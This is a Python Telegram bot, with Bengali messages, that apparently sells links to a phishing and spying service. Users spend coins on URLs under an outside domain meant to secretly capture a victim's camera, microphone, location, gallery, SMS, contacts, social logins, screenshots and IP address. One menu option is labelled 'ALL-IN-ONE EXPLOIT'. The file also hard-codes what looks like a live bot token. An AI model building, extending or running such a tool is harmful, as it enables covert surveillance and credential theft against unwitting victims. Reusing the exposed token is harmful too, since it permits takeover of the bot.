import telebot
from telebot import types
import datetime

# --- CONFIGURATION ---
TOKEN = '8581800352:AAEq3elAZPdm9XRIjnVa5CibBZd2kWz5DD4'
ADMIN_ID = 8293410345
DEV = "@ax_abir_999"
bot = telebot.TeleBot(TOKEN)

# ডাটাবেস (ইউজার কয়েন ও বোনাস ট্র্যাক করতে)
users = {} 
settings = {"chan": "https://t.me/ax_abir_999", "user": "@ax_abir_999"}

def get_header():
    return "<b>🔥 AX-PREDATOR PREMIUM BOT 🔥</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"

# মেইন মেনু বাটন
def main_menu(uid):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [
        types.InlineKeyboardButton("📸 ᴄᴀᴍᴇʀᴀ", callback_data="h_cam"),
        types.InlineKeyboardButton("📍 ʟᴏᴄᴀᴛɪᴏɴ", callback_data="h_loc"),
        types.InlineKeyboardButton("🖼 ɢᴀʟʟᴇʀʏ", callback_data="h_gal"),
        types.InlineKeyboardButton("📂 ꜱᴍꜱ/ᴄᴏɴᴛᴀᴄᴛ", callback_data="h_sms"),
        types.InlineKeyboardButton("🔐 ꜱᴏᴄɪᴀʟ", callback_data="h_soc"),
        types.InlineKeyboardButton("🎙 ᴍɪᴄ", callback_data="h_mic"),
        types.InlineKeyboardButton("📱 ꜱꜱ", callback_data="h_ss"),
        types.InlineKeyboardButton("🌐 ɪᴘ", callback_data="h_ip")
    ]
    markup.add(*btns)
    markup.add(types.InlineKeyboardButton("💀 ALL-IN-ONE EXPLOIT (100🪙) 💀", callback_data="h_all"))
    markup.add(types.InlineKeyboardButton("👤 ᴘʀᴏꜰɪʟᴇ", callback_data="pro"), types.InlineKeyboardButton("🎁 ʙᴏɴᴜꜱ", callback_data="bon"))
    markup.add(types.InlineKeyboardButton("🔗 ʀᴇꜰᴇʀ", callback_data="ref"))
    if uid == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("⚙️ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="adm"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in users:
        users[uid] = {'coins': 30, 'last_bonus': None}
        if len(message.text.split()) > 1:
            rid = int(message.text.split()[1])
            if rid in users and rid != uid:
                users[rid]['coins'] += 50
                bot.send_message(rid, "<b>🎊 নতুন রেফারে ৫০ কয়েন বোনাস পেয়েছেন!</b>", parse_mode='HTML')

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=settings['chan']))
    markup.add(types.InlineKeyboardButton("✅ ᴄʜᴇᴄᴋ ᴊᴏɪɴ", callback_data="chk"))
    bot.send_message(uid, get_header() + "<b>বটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন করুন।</b>", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = call.from_user.id
    if call.data == "chk":
        bot.delete_message(uid, call.message.id)
        bot.send_message(uid, get_header() + "<b>মেনু থেকে অপশন সিলেক্ট করুন:</b>", reply_markup=main_menu(uid), parse_mode='HTML')
    
    elif call.data.startswith("h_"):
        cost = 100 if call.data == "h_all" else 10
        if users.get(uid, {}).get('coins', 0) < cost:
            bot.answer_callback_query(call.id, f"❌ পর্যাপ্ত কয়েন নেই! (প্রয়োজন {cost}🪙)", show_alert=True)
            return
        users[uid]['coins'] -= cost
        h_link = f"https://ax-predator.live/auth?id={uid}&type={call.data}"
        msg = f"<b>🚀 LINK GENERATED!</b>\n\n<b>🔗 URL:</b> <code>{h_link}</code>\n\n<b>⚠️ একবার লিঙ্ক ওপেন করলে ডাটা আসা শুরু হবে।</b>"
        markup = types.InlineKeyboardMarkup()
        if call.data == "h_ss":
            markup.add(types.InlineKeyboardButton("🛑 STOP SCREENSHOT", callback_data="stop"))
        bot.send_message(uid, msg, parse_mode='HTML', reply_markup=markup)

    elif call.data == "bon":
        today = datetime.date.today()
        if users[uid]['last_bonus'] == today:
            bot.answer_callback_query(call.id, "❌ আজ বোনাস নিয়েছেন! কাল আবার আসুন।", show_alert=True)
        else:
            users[uid].update({'coins': users[uid]['coins']+30, 'last_bonus': today})
            bot.answer_callback_query(call.id, "✅ ৩০ কয়েন বোনাস পেয়েছেন!", show_alert=True)

    elif call.data == "adm" and uid == ADMIN_ID:
        bot.send_message(uid, f"<b>🛠 এডমিন প্যানেল</b>\nমোট ইউজার: {len(users)}", parse_mode='HTML')

bot.infinity_polling()
